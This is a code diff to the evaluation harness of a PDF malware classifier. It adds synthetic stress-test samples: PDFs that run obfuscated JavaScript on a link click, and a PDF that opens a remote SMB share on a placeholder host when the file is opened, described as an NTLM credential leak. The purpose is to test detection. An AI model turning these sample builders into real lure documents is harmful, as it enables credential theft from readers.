@@ -27,7 +27,8 @@ import pikepdf
 from sklearn.metrics import confusion_matrix, roc_auc_score
 
 from .features import FEATURE_NAMES, extract_features
-from .model import DEFAULT_MODEL_PATH, SUSPICIOUS_AT, load_model
+from .model import DEFAULT_MODEL_PATH, SUSPICIOUS_AT, load_model, score_features
+from .jsgen import malicious_script
 from .samples import _save, build_benign, build_calculating_form, build_document, build_malicious
 
 HELD_OUT_SEED = 20260926  # training uses 42; tests use 1234
@@ -72,20 +73,38 @@ def _object_streams(rng: random.Random) -> bytes:
 
 
 def _click_triggered_js(rng: random.Random) -> bytes:
-    """JavaScript that runs when the reader clicks a link: no auto-trigger.
+    """Obfuscated JavaScript that runs when the reader clicks a link.
 
-    Not in the training definition of "malicious" (which requires an
-    automatic trigger), so this measures how the model generalises.
+    Training malware always has an automatic trigger, so this measures
+    whether the model generalises from the script content alone.
     """
     with pikepdf.open(io.BytesIO(build_document(rng, encrypt=False))) as pdf:
         action = pdf.make_indirect(pikepdf.Dictionary(
-            S=pikepdf.Name.JavaScript, JS=pikepdf.String("/* inert */ var clicked = 1;")))
+            S=pikepdf.Name.JavaScript, JS=pikepdf.String(malicious_script(rng))))
         annot = pdf.make_indirect(pikepdf.Dictionary(
             Type=pikepdf.Name.Annot, Subtype=pikepdf.Name.Link,
             Rect=[72, 700, 300, 720], Border=[0, 0, 0], A=action))
         page = pdf.pages[0].obj
         page.Annots = page.get("/Annots", pikepdf.Array())
         page.Annots.append(annot)
+        return _save(pdf)
+
+
+def _password_protected(rng: random.Random, malicious: bool) -> bytes:
+    data = build_malicious(rng) if malicious else build_benign(rng)
+    with pikepdf.open(io.BytesIO(data)) as pdf:
+        buf = io.BytesIO()
+        pdf.save(buf, encryption=pikepdf.Encryption(owner="owner", user="invoice2026"))
+    return buf.getvalue()
+
+
+def _remote_gotor(rng: random.Random) -> bytes:
+    """Opens a file on a remote SMB share at open time (NTLM credential leak)."""
+    with pikepdf.open(io.BytesIO(build_document(rng, encrypt=False))) as pdf:
+        host = "".join(rng.choices("abcdefghij", k=6))
+        pdf.Root.OpenAction = pikepdf.Dictionary(
+            S=pikepdf.Name.GoToR, F=pikepdf.String(f"\\\\{host}.invalid\\share\\doc.pdf"),
+            D=pikepdf.Array([0, pikepdf.Name.Fit]))
         return _save(pdf)
 
 
@@ -109,10 +128,13 @@ STRESS_CASES = {
     "truncated file": (_truncated, 1, "broken xref, parser recovery / fallback"),
     "object streams": (_object_streams, 1, "actions inside compressed object streams"),
     "large malicious": (_large_malicious, 1, "40-80 pages, outside training size range"),
-    "click-triggered JS": (_click_triggered_js, 1, "JS on a link click, no auto-trigger (out of distribution)"),
+    "click-triggered JS": (_click_triggered_js, 1, "obfuscated JS on a link click, no auto-trigger"),
+    "remote GoToR": (_remote_gotor, 1, "opens \\\\host\\share on open: NTLM leak, never seen in training"),
+    "password malicious": (lambda r: _password_protected(r, True), 1, "user password: contents unreadable"),
+    "password benign": (lambda r: _password_protected(r, False), 0, "user password: contents unreadable"),
     "truncated benign": (_truncated_benign, 0, "broken benign files must not look malicious"),
     "large benign": (_large_benign, 0, "40-80 pages, outside training size range"),
-    "calculating form": (_calculating_form, 0, "legitimate field-level JavaScript (known false positive)"),
+    "calculating form": (_calculating_form, 0, "legitimate field-level JavaScript (was a false positive)"),
 }
 
 
@@ -137,8 +159,10 @@ class Result:
 
 
 def _score_files(model, paths: list[Path]) -> tuple[np.ndarray, np.ndarray]:
-    X = np.array([extract_features(p).to_vector() for p in paths])
-    return model.predict_proba(X)[:, 1], np.array([rule_baseline(list(x)) for x in X])
+    """Scores exactly as `pdfshield scan` computes them (model + policy)."""
+    feats = [extract_features(p) for p in paths]
+    scores = np.array([score_features(f, model)[0] for f in feats])
+    return scores, np.array([rule_baseline(f.to_vector()) for f in feats])
 
 
 def _write(tmp: Path, name: str, data: bytes) -> Path:
@@ -192,13 +216,15 @@ def evaluate(model_path: Path = DEFAULT_MODEL_PATH, n_held_out: int = 500, n_str
     # 3. real-world files
     real = []
     for d in real_dirs or []:
-        for path in sorted(Path(d).rglob("*.pdf")):
+        paths = sorted(p for p in Path(d).rglob("*") if p.is_file() and p.suffix.lower() == ".pdf")
+        for path in paths:
             label = 1 if "malicious" in path.parts else 0
             feats = extract_features(path)
-            score = float(model.predict_proba([feats.to_vector()])[0][1])
+            vec = feats.to_vector()
+            score = score_features(feats, model)[0]
             real.append({"file": str(path), "true_label": "malicious" if label else "benign",
                          "risk_score": round(score, 4), "correct": int(score >= SUSPICIOUS_AT) == label,
-                         "parse_error": feats.parse_error})
+                         "rule_correct": rule_baseline(vec) == label, "parse_error": feats.parse_error})
     report["real_world"] = real
     return report
 
@@ -220,11 +246,21 @@ def format_report(report: dict) -> str:
     for s in report["stress"]:
         lines.append(f"  {s['case']:<22}{s['true_label']:<11}{s['n']:>4}  "
                      f"{s['model_accuracy']:>7.0%}  {s['rule_accuracy']:>7.0%}")
-    if report["real_world"]:
-        lines += ["", "Real-world files"]
-        for f in report["real_world"]:
-            mark = "ok " if f["correct"] else "MISS"
-            lines.append(f"  [{mark}] {f['true_label']:<9} risk {f['risk_score']:.0%}  {f['file']}")
+    real = report["real_world"]
+    if real:
+        lines += ["", f"Real-world files ({len(real)})"]
+        for label in ("benign", "malicious"):
+            group = [f for f in real if f["true_label"] == label]
+            if not group:
+                continue
+            ok, rule_ok = sum(f["correct"] for f in group), sum(f["rule_correct"] for f in group)
+            lines.append(f"  {label:<10} model {ok}/{len(group)} ({ok / len(group):.1%})   "
+                         f"rule {rule_ok}/{len(group)} ({rule_ok / len(group):.1%})")
+        misses = [f for f in real if not f["correct"]]
+        for f in misses[:25]:
+            lines.append(f"  MISS  {f['true_label']:<9} risk {f['risk_score']:.0%}  {f['file']}")
+        if len(misses) > 25:
+            lines.append(f"  ... and {len(misses) - 25} more (see --output)")
     return "\n".join(lines)
 
 
